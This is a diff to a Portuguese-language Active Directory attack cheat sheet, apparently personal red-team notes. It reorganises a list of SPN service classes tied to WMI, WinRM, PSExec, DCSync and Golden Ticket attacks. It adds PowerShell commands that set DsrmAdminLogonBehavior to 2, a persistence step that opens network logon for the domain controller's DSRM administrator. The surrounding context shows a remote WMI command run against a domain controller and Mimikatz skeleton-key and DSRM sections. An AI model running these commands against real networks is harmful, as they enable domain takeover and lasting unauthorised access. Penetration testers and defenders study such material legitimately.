@@ -1434,6 +1434,26 @@ RODAR COMANDO VIA WMI:
 ```
 Invoke-WmiMethod win32_process -ComputerName tech-dc01.tech.local -name create -argumentlist "cmd.exe /c whoami > c:\fudeu.txt"
 ```
+[SPN](https://adsecurity.org/?page_id=183)
+
+SERVIÇOS:
+- HOST, RPCSS - for WMI interactions
+- HOST for Schtasks
+- LDAP for LDAP including DCsync attack
+- HOST, HTTP for WinRM
+- HOST, HTTP, WSMAN, RPCSS - for PowerShell Remoting
+
+SERVIÇOS:
+- WMI INTERACTIONS - HOST, RPCSS
+- POWERSHELL REMOTING - HOST, HTTP, WSMAN, RPCSS     DEPENDE: WSMAN,RPCSS
+- WINRM - HOST,HTTP *** EM ALGUNS CASOIS PODE PEDIR SOMENTE WINRM
+- SCHEDULED TASKS - HOST
+- WINDOWS FILE SHARE  - CIFS
+- PSEXEC - CIFS
+- LDAP OPERATIONS - LDAP
+- LDAP DCSYNC - LDAP
+- WINDOWS REMOTE SERVER ADMINISTRAION TOOLS - RPCSS, LDAP, CIFS
+- GOLDEN TICKET - krbtgt
 ## SKELETON KEY MIMIKATZ
 ##### SKELETON KEY MIMIKATZ - LOAD REQUIREMENTS
 ```
@@ -1482,8 +1502,6 @@ ACESSAR REMOTAMENTE: (Senha: mimikatz)
 ```
 enter-pssession -computername tech-dc01 -credential tech\administrator
 ```
-
-
 ## DSRM MIMIKATZ (CONTA DE ADMINISTRADOR LOCAL DO DOMAIN CONTROLLER)
 ##### DSRM MIMIKATZ - LOAD REQUIREMENTS
 ```
@@ -1515,6 +1533,8 @@ lsadump::sam
 CRIAR ENTRADA NO REGISTRO PARA LIBERAR LOGIN DO ADMINISTRADOR LOCAL
 ```
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
 ```
 
 
@@ -1531,26 +1551,11 @@ New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminL
 
 
 
-[SPN](https://adsecurity.org/?page_id=183)
 
-SERVIÇOS:
-- HOST, RPCSS - for WMI interactions
-- HOST for Schtasks
-- LDAP for LDAP including DCsync attack
-- HOST, HTTP for WinRM
-- HOST, HTTP, WSMAN, RPCSS - for PowerShell Remoting
 
-SERVIÇOS:
-- WMI INTERACTIONS - HOST, RPCSS
-- POWERSHELL REMOTING - HOST, HTTP, WSMAN, RPCSS     DEPENDE: WSMAN,RPCSS
-- WINRM - HOST,HTTP *** EM ALGUNS CASOIS PODE PEDIR SOMENTE WINRM
-- SCHEDULED TASKS - HOST
-- WINDOWS FILE SHARE  - CIFS
-- PSEXEC - CIFS
-- LDAP OPERATIONS - LDAP
-- LDAP DCSYNC - LDAP
-- WINDOWS REMOTE SERVER ADMINISTRAION TOOLS - RPCSS, LDAP, CIFS
-- GOLDEN TICKET - krbtgt
+
+
+
  
 
 
